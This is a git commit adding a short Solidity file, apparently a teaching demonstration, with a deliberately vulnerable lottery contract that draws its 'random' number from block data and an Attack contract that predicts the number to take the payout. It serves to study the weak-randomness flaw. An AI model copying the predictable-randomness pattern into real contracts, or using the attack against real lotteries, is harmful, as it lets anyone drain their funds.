61c24f5d1e8d9e71f1e393188ea627112a5130b5
ImanSharaf <78227895+ImanSharaf@users.noreply.github.com>
2021-10-30 19:52:41 -0700

    Create WeakRandomGenerator.sol

---
+++ WeakRandomGenerator.sol
@@ -0,0 +1,31 @@
+pragma solidity ^0.6.0;
+
+
+
+contract VulnerableLottery{
+    constructor() public payable {}
+    
+    function selectWinner(uint _number) public {
+        uint result = uint(keccak256(abi.encodePacked(blockhash(block.number -1), block.timestamp)));
+        
+        if(  _number == result){
+            (bool sent,) = msg.sender.call{value: 1 ether} ("");
+            require (sent, "Failed");
+        }
+    }
+}
+
+contract Attack {
+    fallback() external payable {}
+    
+    function attack( VulnerableLottery vulnerableLottery) public {
+         uint result = uint(keccak256(abi.encodePacked(blockhash(block.number -1), block.timestamp)));
+        
+        vulnerableLottery.selectWinner(result);
+        
+    }
+    
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
